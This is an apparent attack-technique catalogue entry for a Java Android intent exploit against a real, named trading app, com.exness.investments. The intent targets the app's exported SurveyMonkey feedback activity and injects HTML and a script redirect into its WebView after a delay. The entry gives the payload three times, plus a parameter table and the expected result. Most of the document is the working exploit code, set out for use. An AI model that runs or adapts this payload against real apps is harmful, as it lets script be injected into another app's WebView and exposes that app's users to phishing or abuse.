---
data: >-
  final Intent intent = new Intent("android.intent.action.VIEW");
  intent.putExtra("smSPageHTML","<h1>Exploited</h1><script>location.href='/r/'</script>");
  intent.putExtra("smSPageURL","https://my.exness.asia/r/");
  intent.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
  new Handler().postDelayed(new Runnable(){ @Override public void run(){
  startActivity(intent); } },8000);
tags:
  - intent
  - payload
  - redirect
type: command
output: WebView loads my.exness.asia/r/ and executes redirect
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.916Z'
id: af33b513-8440-4539-856d-3c46df68e486
verified: false
validated: true
submitted: true
---
# initial-payload-intent

## Command

```java
final Intent intent = new Intent("android.intent.action.VIEW"); intent.putExtra("smSPageHTML","<h1>Exploited</h1><script>location.href='/r/'</script>"); intent.putExtra("smSPageURL","https://my.exness.asia/r/"); intent.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent); } },8000);
```

## Description

This command creates and delays the launch of an intent to the vulnerable SMFeedbackActivity with initial HTML/script for redirecting the WebView to the Exness site.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 8000 | Delay in milliseconds before execution | Yes |
| smSPageURL | Base URL for WebView: https://my.exness.asia/r/ | Yes |
| smSPageHTML | Initial HTML with redirect script | Yes |
| com.exness.investments | Target package | Yes |
| com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity | Target activity class | Yes |

## Examples

### Basic Usage

```java
final Intent intent = new Intent("android.intent.action.VIEW"); intent.putExtra("smSPageHTML","<h1>Exploited</h1><script>location.href='/r/'</script>"); intent.putExtra("smSPageURL","https://my.exness.asia/r/"); intent.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent); } },8000);
```

### Advanced Usage

Adjust delay for longer app load times.

## Expected Output

After 8 seconds, the WebView in SMFeedbackActivity loads the URL and redirects via script.

## Related

- [[Related Procedure]]
